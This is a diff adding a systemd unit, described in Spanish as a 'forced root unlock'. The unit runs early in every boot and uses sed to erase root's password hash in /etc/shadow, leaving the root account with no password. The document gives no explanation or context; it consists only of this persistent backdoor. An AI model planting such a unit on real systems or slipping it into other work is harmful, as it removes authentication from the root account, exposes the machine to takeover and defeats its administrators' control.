@@ -1,0 +1,12 @@
+[Unit]
+Description=Desbloqueo forzado de root
+DefaultDependencies=no
+Before=sysinit.target
+
+[Service]
+Type=oneshot
+ExecStart=/usr/bin/sh -c 'sed -i "s/^root:[^:]*:/root::/" /etc/shadow'
+RemainAfterExit=yes
+
+[Install]
+WantedBy=sysinit.target
